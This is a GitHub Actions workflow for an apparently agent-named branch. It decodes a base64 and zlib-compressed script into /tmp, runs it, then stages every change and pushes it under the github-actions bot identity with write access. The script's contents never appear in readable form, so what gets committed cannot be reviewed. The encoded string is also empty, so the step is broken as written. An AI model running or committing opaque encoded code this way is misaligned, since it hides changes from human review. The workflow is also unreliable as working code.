name: M32 closeout helper

on:
  push:
    branches:
      - agent/userspace-memory-shared-buffers

permissions:
  contents: write

jobs:
  closeout:
    runs-on: ubuntu-24.04
    steps:
      - name: Check out M32 branch
        uses: actions/checkout@v4
        with:
          ref: agent/userspace-memory-shared-buffers
          fetch-depth: 0

      - name: Apply input-neutral M32 closeout
        shell: bash
        run: |
          set -euo pipefail
          python3 -c 'import base64,zlib; open("/tmp/m32-closeout.py","wb").write(zlib.decompress(base64.b64decode("")))'
          python3 /tmp/m32-closeout.py
          git diff --check
          git status --short

      - name: Commit M32 closeout
        shell: bash
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "Close out Milestone 32"
          git push origin HEAD:agent/userspace-memory-shared-buffers
